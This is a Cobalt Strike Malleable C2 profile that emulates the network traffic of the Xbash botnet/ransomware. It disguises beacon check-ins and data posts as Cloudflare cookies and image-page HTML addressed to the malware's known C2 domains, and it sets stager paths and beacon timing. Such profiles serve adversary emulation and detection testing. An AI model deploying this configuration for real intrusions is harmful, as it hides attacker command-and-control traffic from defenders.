#xbash malware profile
#https://researchcenter.paloaltonetworks.com/2018/09/unit42-xbash-combines-botnet-ransomware-coinmining-worm-targets-linux-windows/
#https://www.hybrid-analysis.com/sample/725efd0f5310763bc5375e7b72dbb2e883ad90ec32d6177c578a1c04c1b62054?environmentId=100
#sample = 725efd0f5310763bc5375e7b72dbb2e883ad90ec32d6177c578a1c04c1b62054  reg9.sct
#xx0hcd


set sleeptime "30000";
set jitter    "20";
set useragent "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET4.0E; QQBrowser/7.0.3698.400)";
set dns_idle "8.8.8.8";
set maxdns    "235";
set sample_name "xbash profile";

#prob not using ssl if testing malware traffic.
#https-certificate {
#  set keystore "demo.store";
#  set password "whateverpass";
#}


#prob have to change Host header to something legit depending on testing.
http-get {

    set uri "/m.png";
    
    client {

	header "Host" "png.realtimenews.tk";
	header "Connection" "Keep-Alive";
	
        
        metadata {
            base64;
	    prepend "__cfduid=";	    
	    header "Cookie";

        }

    }

    server {

	header "Server" "cloudflare";
	header "Content-Type" "text/html; charset=utf-8";
	header "Connection" "keep-alive";
	header "Content-Security-Policy" "default-src 'none'; style-src 'unsafe-inline'; img-src data:; connect-src 'self'";
	header "X-Github-Request-Id" "7184:5EA1:1693DD4:1EEFFEA:5B9FC138";
	header "Via" "1.1 varnish";
	header "X-Served-By" "cache-hhn1544-HHN";
	header "X-Cache" "MISS";
	header "X-Cache-Hits" "0";
	header "CF-RAY" "45bc6f44849e9706-FRA";
        
#using newline ("\n") shows as a period (".") in c2lint, but looks correct in wireshark.
        output {

            base64;
	    prepend "    <img width=\"32\" height=\"32\" title=\"\" alt=\"\" src=\"data:image/png;base64,\n";
	    prepend "<a href=\"/\" class=\"logo logo-img-1x\">\n";
	    prepend "  <head>\n";
	    prepend "<html>\n";
	    prepend "<!DOCTYPE html>\n";
	    prepend "239c\n";
	    append "</a>\n";
	    append "</html>";
            print;
	    
        }
    }
}

http-post {
    
    set uri "/domain/all";

    client {

	header "Host" "scan.censys.xyz";
	header "Accept-Encoding" "identity";
	header "Accept-Language" "en-US,en;q=0.8";
	header "Accept" "*/*";
	header "Accept-Charset" "ISO-8859-1,utf-8";
#	header "Content-Type" "application/x-www-form-urlencoded; charset=UTF-8";     
        
        output {
            base64;	    
	    prepend "__cfduid=";
	    	    
	    header "Cookie";


        }


        id {
	    base64url;
	    parameter "c";

        }
    }

    server {

	header "Server" "cloudflare";
	header "Content-Type" "text/html; charset=utf-8";
	header "CF-RAY" "455f7b1280ac5368-MIA";
        

        output {
            netbios;
	    prepend "imusee.net";
	    prepend "iamnotthisold.net\n";
	    prepend "hsdoor.net\n";
	    prepend "ingramsoftware.net\n";
	    prepend "houjin-card.net\n";
	    prepend "huiego.net\n";
	    prepend "himanshutyagi.net\n";
	    prepend "innostudio.net\n";
	    prepend "herosandcons.net\n";
	    prepend "indigolightstudios.net\n";
	    prepend "huishubao.net\n";
	    prepend "1635\n";	    
	   
            print;
        }
    }
}

http-stager {

    set uri_x86 "/port/tcp8080";
    set uri_x64 "/cidir";

    client {
	header "Host" "png.realtimenews.tk";
	header "Connection" "Keep-Alive";
    }

    server {
	header "Server" "cloudflare";
	header "Content-Type" "text/html; charset=utf-8";
	header "CF-RAY" "455f7b1280ac5368-MIA";
    
    }


}


stage {
	set checksum       "0";
	set compile_time   "12 Jun 2018 11:22:23";
	set image_size_x86 "559966";
	set image_size_x64 "559966";
}


